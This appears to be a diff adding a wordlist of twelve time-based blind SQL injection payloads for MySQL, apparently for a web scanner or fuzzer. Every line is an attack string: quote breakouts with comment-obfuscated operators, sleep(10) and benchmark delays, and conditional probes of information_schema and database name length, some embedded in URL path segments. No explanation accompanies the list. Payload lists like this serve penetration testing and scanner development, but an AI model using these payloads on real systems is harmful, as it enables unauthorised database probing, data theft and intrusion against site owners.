@@ -1,0 +1,12 @@
+/' and/*sc13(*/ sleep(10) -- a
+/' and/*sc13(*/ benchmark(10000000,MD5(1)) -- a
+/' and/*sc13(*/ if((select count(*) from information_schema.tables)>0, sleep(10), 1) -- a
+/" and/*sc13(*/ sleep(10) -- a
+/" and/*sc13(*/ benchmark(10000000,MD5(1)) -- a
+/" and/*sc13(*/ if((select count(*) from information_schema.tables)>0, sleep(10), 1) -- a
+/fx/0'oR/*sc13(*/+(if(length(database())>1,sleep(10),1))--+a/rule/
+/fx/0'or (if(length(database())>1,sleep(10),1))-- a/rule/
+/fx/0"or (if(length(database())>1,sleep(10),1))-- a/rule/
+/fx/0"oR/*sc13(*/+(if(length(database())>1,sleep(10),1))--+a/rule/
+/fx/0)'+oR/*sc13(*/+sleep(10)--+a/rule/
+/fx/0)"+oR/*sc13(*/+sleep(10)--+a/rule/
